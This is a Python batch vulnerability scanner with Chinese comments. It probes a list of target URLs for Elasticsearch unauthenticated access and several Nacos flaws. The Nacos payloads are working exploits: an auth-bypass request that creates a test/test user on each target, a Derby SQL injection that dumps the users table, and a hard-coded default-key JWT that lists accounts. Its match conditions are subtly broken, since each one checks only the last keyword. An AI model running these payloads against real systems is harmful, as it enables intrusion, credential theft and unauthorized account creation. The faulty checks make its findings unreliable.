'''
Description:[自定义漏洞扫描函数]
Author:[huan666]
Date:[2024/8/28]
update:[2024/8/28]
'''
import requests
import basic
import sys
from datetime import datetime


# es未授权访问漏洞批量检测
def es_unauthorized():

    hearder={
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)'
    }

    # 资产文件存入列表
    url_list = basic.url_file_ip_list()

    # 提取es资产存入列表
    try:
        es_url_list = []
        for i in url_list:
            if ':9200' in i:
                es_url_list.append(i)
    except Exception as e:
        print("捕获到异常:", e)
    
    # 循环es资产列表判断是否存在未授权访问漏洞
    for url in es_url_list:
        # 获取当前时间
        now = datetime.now()

        # 格式化时间，只保留时、分、秒
        formatted_time = now.strftime("%H:%M:%S")

        try:
            # 忽略ssl证书验证
            res = requests.get(url,headers=hearder,allow_redirects=False,timeout=2,verify=False)
            res.encoding='utf-8'
            restext = res.text
            if 'cluster_name' and 'cluster_uuid' and 'version' in restext:
                print("[+]"+" "+formatted_time+" "+"目标："+" "+url+" "+"存在未授权访问漏洞")
        except:
            pass



# nacos漏洞扫描
def nacos_vuln_scan():

    hearders = {
        'User-Agent': 'Nacos-Server',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close',
        'Upgrade-Insecure-Requests': '1',
        'Priority': 'u=0, i'
    }

    # 资产文件存入列表
    url_list = basic.url_file_ip_list()
    # 遍历列表判断是否存在nacos默认配置未授权访问漏洞
    for url in url_list:
        # 获取当前时间
        now = datetime.now()
        # 格式化时间，只保留时、分、秒
        formatted_time = now.strftime("%H:%M:%S")

        # 验证nacos默认配置未授权访问漏洞
        poc_dir = "/nacos/v1/auth/users?pageNo=1&pageSize=9"
        try:
            # 忽略ssl证书验证
            res = requests.get(url+poc_dir,headers=hearders,allow_redirects=False,timeout=2,verify=False)
            res.encoding='utf-8'
            restext = res.text
            if 'totalCount' and 'username' and 'password' in restext:
                print("[+]"+" "+formatted_time+" "+"目标："+" "+url+poc_dir+" "+"存在nacos默认配置未授权访问漏洞")
        except:
            pass

        # 验证nacos权限绕过漏洞，并新增用户（test/test）
        auth_poc_dir = "/nacos/v1/auth/users"
        # POST请求参数
        data = {
            'username':'test',
            'password':'test'
        }
        try:
            # 发送POST请求,忽略ssl验证
            response = requests.post(url+auth_poc_dir, data=data, headers=hearders,allow_redirects=False,timeout=2,verify=False)
            response.encoding='utf-8'
            response_text = response.text
            if '200' and 'create' and 'user' and 'ok' in response_text:
                 # 忽略ssl证书验证
                res = requests.get(url+poc_dir,headers=hearders,allow_redirects=False,timeout=2,verify=False)
                res.encoding='utf-8'
                restext = res.text
                if 'test' and 'username' in restext:
                    print("[+]"+" "+formatted_time+" "+"目标："+" "+url+poc_dir+" "+"存在权限绕过漏洞并新增用户(test/test)")
        except:
            pass

        # Nacos Derby SQL注入漏洞验证
        nacos_sql_inject_dir = "/nacos/v1/cs/ops/derby?sql=%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%75%73%65%72%73"
        try:
            # 忽略ssl证书验证
            res_sql = requests.get(url+nacos_sql_inject_dir,headers=hearders,allow_redirects=False,timeout=2,verify=False)
            res_sql.encoding='utf-8'
            res_sql_text = res_sql.text
            if '200' and 'USERNAME' and 'PASSWORD' and 'true' in res_sql_text:
                print("[+]"+" "+formatted_time+" "+"目标："+" "+url+nacos_sql_inject_dir+" "+"存在 Nacos Derby SQL注入漏洞")
        except:
            pass

        # nacos默认密钥导致的未授权访问漏洞
        nacos_secret_dir = "/nacos/v1/auth/users?accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY5ODg5NDcyN30.feetKmWoPnMkAebjkNnyuKo6c21_hzTgu0dfNqbdpZQ&pageNo=1&pageSize=9"
        try:
            # 忽略ssl证书验证
            res_secret = requests.get(url+nacos_secret_dir,headers=hearders,allow_redirects=False,timeout=2,verify=False)
            res_secret.encoding='utf-8'
            res_secret_text = res_secret.text
            if 'totalCount' and 'username' and 'password' and 'pageItems' in res_secret_text:
                print("[+]"+" "+formatted_time+" "+"目标："+" "+url+nacos_secret_dir+" "+"存在 Nacos secret.key默认密钥 未授权访问漏洞")
        except:
            pass


if __name__ == "__main__":
    if len(sys.argv) > 1:
        func_name = sys.argv[1]
        if func_name == 'es_unauthorized':
            es_unauthorized()
        elif func_name == 'nacos_vuln_scan':
            nacos_vuln_scan()
        else:
            print("Invalid function number")
    else:
        print("No function number provided")